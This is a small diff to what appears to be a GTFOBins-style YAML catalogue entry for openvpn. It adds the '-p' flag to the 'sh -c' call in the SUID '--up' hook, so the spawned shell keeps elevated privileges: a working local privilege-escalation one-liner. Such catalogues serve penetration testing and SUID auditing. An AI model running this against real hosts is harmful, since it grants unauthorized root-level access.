@@ -7,7 +7,7 @@ functions:
   suid:
     - code: |
         COMMAND='id'
-        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -c \"$COMMAND\""
+        openvpn --dev tun0 --script-security 2 --up "/usr/bin/sh -p -c \"$COMMAND\""
   sudo:
     - code: |
         COMMAND='id'
